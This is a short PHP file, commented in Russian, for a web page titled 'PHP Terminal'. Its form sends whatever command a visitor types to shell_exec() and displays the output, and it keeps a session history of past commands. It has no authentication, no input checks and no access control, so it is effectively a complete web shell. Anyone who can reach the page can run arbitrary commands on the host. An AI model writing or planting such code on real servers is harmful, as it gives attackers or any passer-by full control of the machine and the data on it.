<?php
session_start();

// Хранение истории команд
if (!isset($_SESSION['history'])) {
    $_SESSION['history'] = [];
}

// Обработка отправленных данных
$output = '';
if ($_SERVER['REQUEST_METHOD'] == 'POST' && !empty($_POST['command'])) {
    // Получаем команду
    $command = trim($_POST['command']);
    
    // Выполнение команды
    $output = shell_exec($command);

    // Сохраняем команду в истории
    $_SESSION['history'][] = $command;
}

// Функция для отображения истории команд
function displayHistory($history) {
    if (empty($history)) {
        return '';
    }
    $historyOutput = '<h4>History:</h4><ul>';
    foreach ($history as $cmd) {
        $historyOutput .= '<li>' . htmlspecialchars($cmd) . '</li>';
    }
    $historyOutput .= '</ul>';
    return $historyOutput;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Terminal</title>
    <style>
        body { font-family: Arial, sans-serif; }
        textarea { width: 100%; height: 200px; }
        form { margin-top: 20px; }
        .output { background-color: #f4f4f4; padding: 10px; border: 1px solid #cecece; }
    </style>
</head>
<body>

<h1>PHP Terminal</h1>

<!-- Форма для ввода команды -->
<form method="post">
    <textarea name="command" placeholder="Введите команду" required></textarea>
    <br>
    <button type="submit">Выполнить</button>
</form>

<!-- Отображение результата выполнения команды -->
<h2>Результат:</h2>
<div class="output">
    <?php
    if (!empty($output)) {
        echo '<pre>' . htmlspecialchars($output) . '</pre>';
    }
    ?>
</div>

<!-- Отображение истории команд -->
<div>
    <?= displayHistory($_SESSION['history']); ?>
</div>

</body>
</html>
